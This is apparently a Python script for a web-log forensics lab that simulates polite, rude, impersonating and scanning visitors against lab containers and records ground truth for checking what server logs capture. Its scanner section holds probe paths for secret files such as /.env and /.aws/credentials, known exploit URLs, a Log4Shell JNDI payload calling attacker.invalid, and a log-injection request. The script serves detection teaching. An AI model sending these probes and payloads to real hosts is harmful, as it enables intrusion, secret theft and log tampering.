#!/usr/bin/env python3
"""Simulated visitors for the playground (standard library only).

Every actor writes what it actually did to logs/ground_truth.jsonl, so you can later check
what the server logs did and did not capture (exercise 1, "blind log").

Actors (each runs in its own container with its own IP, see docker-compose.yml):
  polite     reads robots.txt and obeys it, follows links, downloads PDFs without reading them
  rude       pretends to be Chrome, ignores robots.txt (even visits the disallowed paths),
             reads HTML comments, downloads PDFs and extracts URLs from them; those PDF URLs
             are only *harvested* (written to logs/harvested_urls.jsonl), not requested
  resolver   a different machine that later requests the harvested URLs and looks around
  scanner    probes typical vulnerability paths, sends a Log4Shell-style payload in a header,
             and a few malformed / edge-case requests
  fakebot    claims to be Googlebot, from an address that is not Google's

ONLY point this at the lab's own containers. Scanning other people's hosts is not allowed.
"""

import argparse
import json
import os
import re
import socket
import time
import urllib.error
import urllib.parse
import urllib.request
import urllib.robotparser
from html.parser import HTMLParser

LOG_DIR = os.environ.get("CRAWL_LOG_DIR", "/logs")
MAX_BODY = 2_000_000

UAS = {
    "polite": "PoliteLabBot/0.1 (+http://www.crawl-lab.test/bot.html)",
    "rude": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "resolver": "python-requests/2.31.0",
    "scanner": "Mozilla/5.0 zgrab/0.x",
    "fakebot": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
}

SCAN_PATHS = ["/.env", "/.git/config", "/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/phpmyadmin/",
              "/server-status", "/actuator/health", "/boaform/admin/formLogin", "/cgi-bin/luci/;stok=/locale",
              "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "/backup.sql", "/config.php.bak",
              "/.aws/credentials", "/index.php?s=/index/\\think\\app/invokefunction",
              "/?x=${jndi:ldap://attacker.invalid/a}"]


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.links, self.comments = [], []

    def handle_starttag(self, tag, attrs):
        for k, v in attrs:
            if k in ("href", "src") and v:
                self.links.append(v)

    def handle_comment(self, data):
        self.comments.append(data)


URL_IN_TEXT = re.compile(r"(?:https?://[^\s\"'<>()\\]+|/[A-Za-z0-9._~/%-]+\.html)")
URL_IN_PDF = re.compile(rb"https?://[^\s()<>\\]+")


class Actor:
    def __init__(self, name, base):
        self.name, self.base = name, base.rstrip("/")
        self.ua = UAS[name]
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        self.ip = self._own_ip()
        os.makedirs(LOG_DIR, exist_ok=True)

    def _own_ip(self):
        try:
            host = urllib.parse.urlparse(self.base).hostname
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((socket.gethostbyname(host), 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except OSError:
            return "?"

    def record(self, **kw):
        kw = {"ts": time.time(), "actor": self.name, "client_ip": self.ip, **kw}
        with open(os.path.join(LOG_DIR, "ground_truth.jsonl"), "a") as f:
            f.write(json.dumps(kw) + "\n")

    def get(self, url, headers=None, note=""):
        if url.startswith("/"):
            url = self.base + url
        req = urllib.request.Request(url, headers={"User-Agent": self.ua, **(headers or {})})
        status, ctype, body = None, "", b""
        try:
            with self.opener.open(req, timeout=10) as r:
                status, ctype, body = r.status, r.headers.get("Content-Type", ""), r.read(MAX_BODY)
        except urllib.error.HTTPError as e:
            status, ctype = e.code, e.headers.get("Content-Type", "")
        except Exception as e:  # network errors etc.
            note = (note + " error: %s" % e).strip()
        self.record(method="GET", url=url, status=status, user_agent=self.ua,
                    extra_headers=headers or {}, note=note)
        print("%-8s %s %s" % (self.name, status, url))
        return status, ctype, body

    def same_site(self, url):
        return urllib.parse.urlparse(url).netloc == urllib.parse.urlparse(self.base).netloc

    def crawl(self, start="/", max_pages=60, delay=0.2, robots=None, read_comments=False,
              extra_start=(), harvest_pdfs=False):
        queue = [self.base + start] + [self.base + p for p in extra_start]
        seen = set()
        while queue and len(seen) < max_pages:
            url = urllib.parse.urldefrag(queue.pop(0))[0]
            if url in seen or not self.same_site(url):
                continue
            if robots and not robots.can_fetch(self.ua, url):
                self.record(method="-", url=url, status=None, user_agent=self.ua, note="skipped: disallowed by robots.txt")
                continue
            seen.add(url)
            status, ctype, body = self.get(url)
            time.sleep(delay)
            if not body:
                continue
            if "html" in ctype:
                p = Links()
                p.feed(body.decode("utf-8", "replace"))
                found = p.links
                if read_comments:
                    for c in p.comments:
                        found += URL_IN_TEXT.findall(c)
                queue += [urllib.parse.urljoin(url, l) for l in found]
            elif "pdf" in ctype and harvest_pdfs:
                for u in sorted(set(m.decode("latin-1") for m in URL_IN_PDF.findall(body))):
                    with open(os.path.join(LOG_DIR, "harvested_urls.jsonl"), "a") as f:
                        f.write(json.dumps({"ts": time.time(), "harvested_by": self.name, "from": url, "url": u}) + "\n")
                    self.record(method="-", url=u, status=None, user_agent=self.ua,
                                note="harvested from PDF %s (not requested)" % url)
        return seen

    def robots(self):
        status, _, body = self.get("/robots.txt")
        rp = urllib.robotparser.RobotFileParser()
        rp.parse(body.decode("utf-8", "replace").splitlines() if status == 200 else [])
        disallowed = re.findall(r"(?im)^\s*Disallow:\s*(\S+)", body.decode("utf-8", "replace")) if body else []
        return rp, disallowed

    def raw(self, payload, note):
        """Send raw bytes over TCP (for requests urllib refuses to build)."""
        host = urllib.parse.urlparse(self.base).hostname
        try:
            with socket.create_connection((host, 80), timeout=5) as s:
                s.sendall(payload)
                resp = s.recv(200)
            status = resp.split(b" ")[1].decode() if resp.startswith(b"HTTP/") else None
        except OSError as e:
            status, note = None, note + " error: %s" % e
        self.record(method="RAW", url=repr(payload[:120]), status=status, user_agent="(raw)", note=note)
        print("%-8s %s RAW %s" % (self.name, status, note))


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("actor", choices=sorted(UAS))
    ap.add_argument("--base", default=os.environ.get("CRAWL_TARGET", "http://www.crawl-lab.test"))
    ap.add_argument("--wait", type=float, default=float(os.environ.get("CRAWL_WAIT", "0")),
                    help="seconds to wait before starting (resolver: simulates 'weeks later')")
    args = ap.parse_args()
    a = Actor(args.actor, args.base)
    time.sleep(args.wait)

    if args.actor == "polite":
        rp, _ = a.robots()
        a.crawl(robots=rp, delay=0.3)

    elif args.actor == "fakebot":
        rp, _ = a.robots()
        a.crawl(robots=rp, max_pages=10, delay=0.5)

    elif args.actor == "rude":
        _, disallowed = a.robots()             # reads robots.txt only to find "interesting" paths
        a.crawl(read_comments=True, extra_start=disallowed, harvest_pdfs=True, delay=0.05)

    elif args.actor == "resolver":
        path = os.path.join(LOG_DIR, "harvested_urls.jsonl")
        if not os.path.exists(path):
            print("nothing harvested yet - run the 'rude' actor first")
            return
        urls = sorted({json.loads(l)["url"] for l in open(path) if l.strip()})
        for u in urls:
            status, ctype, body = a.get(u, note="resolving harvested URL")
            if body and "html" in ctype:       # look around a little: "session after token access"
                p = Links()
                p.feed(body.decode("utf-8", "replace"))
                for l in p.links[:3]:
                    a.get(urllib.parse.urljoin(u, l), note="follow-up after token")
                    time.sleep(0.5)

    elif args.actor == "scanner":
        for pth in SCAN_PATHS:
            a.get(pth)
            time.sleep(0.05)
        # Log4Shell-style payload in a header: invisible in common/combined logs
        a.get("/", headers={"X-Api-Version": "${jndi:ldap://attacker.invalid/a}"}, note="payload in header")
        host = urllib.parse.urlparse(a.base).hostname
        a.raw(b"GET / HTTP/1.0\r\n\r\n", "HTTP/1.0 request without Host header")
        a.raw(b"\x16\x03\x01\x00\xa5\x01\x00\x00\xa1\x03\x03" + os.urandom(32), "TLS handshake sent to plain HTTP port")
        a.raw(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nUser-Agent: evil\" 200 0 \"-\" \"fake-entry\x1b[31m\r\n"
              b"Connection: close\r\n\r\n", "log injection attempt in User-Agent")
        a.raw(b"PROPFIND / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n", "unusual method")


if __name__ == "__main__":
    main()
